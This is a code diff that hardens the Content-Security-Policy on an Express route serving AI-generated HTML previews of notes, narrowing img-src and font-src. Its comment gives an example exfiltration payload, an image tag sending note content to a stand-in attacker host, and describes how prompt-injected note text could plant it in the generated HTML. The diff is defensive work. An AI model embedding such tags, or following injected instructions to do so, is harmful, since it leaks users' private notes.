@@ -1,4 +1,4 @@
-import { Router } from 'express';
+import express, { Router } from 'express';
 import { randomBytes } from 'node:crypto';
 import { asyncHandler } from '../middleware/error.js';
 import { requireAuth } from '../middleware/auth.js';
@@ -24,6 +24,7 @@ async function toDto(r: HtmlPreviewRecord) {
 
 export const htmlPreviewRouter = Router();
 htmlPreviewRouter.use(requireAuth);
+htmlPreviewRouter.use(express.json({ limit: '8mb' })); // note content + prompt
 
 htmlPreviewRouter.get(
   '/',
@@ -136,9 +137,15 @@ htmlPreviewRouter.get(
       res.status(404).send('Not found');
       return;
     }
+    // img-src/font-src are 'self' data: blob: (not '*'): the generation prompt
+    // requires a fully self-contained file with no external assets, so nothing
+    // legitimate needs a cross-origin fetch. Left wide open, a note whose text
+    // got prompt-injected into the generated HTML could still exfiltrate note
+    // content via `<img src="https://attacker/?d=...">` even with connect-src
+    // 'none' (img loads aren't gated by connect-src).
     res.setHeader(
       'Content-Security-Policy',
-      "sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src * data: blob:; font-src * data:; connect-src 'none'; frame-ancestors 'self'",
+      "sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'none'; frame-ancestors 'self'",
     );
     res.type('html').send(html);
   }),
